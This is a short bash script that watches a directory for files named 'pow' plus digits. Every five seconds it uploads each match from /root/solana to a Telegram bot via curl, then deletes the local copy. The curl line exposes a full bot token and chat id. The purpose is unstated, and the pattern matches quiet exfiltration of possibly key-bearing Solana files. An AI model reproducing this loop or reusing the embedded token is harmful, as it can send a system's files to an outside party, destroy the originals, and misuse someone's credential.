#!/bin/bash


while true; do

    # Execute the find command and store the result in the "result" variable
    result=$(find . -type f -name 'pow[0-9][0-9][0-9][0-9]*')

    # Check if there are any results
    if [ -n "$result" ]; then
        # Loop through each result
        for file in $result; do
            # Output the content of the file
            # cat "$file"
            # Get the content of the file
            # content=$(cat "$file")
            # Encode the content for the URL
            # encoded_content=$(urlencode "$content")
            # Get the filename
            filename=$(basename "$file")

            

            # Make a curl GET request with the content of the file appended to the URL
            curl -v -F "chat_id=638066999" -F document=@/root/solana/$filename https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendDocument
            rm $filename
        done
    fi

    # Sleep for 5 seconds before the next iteration
    sleep 5
done
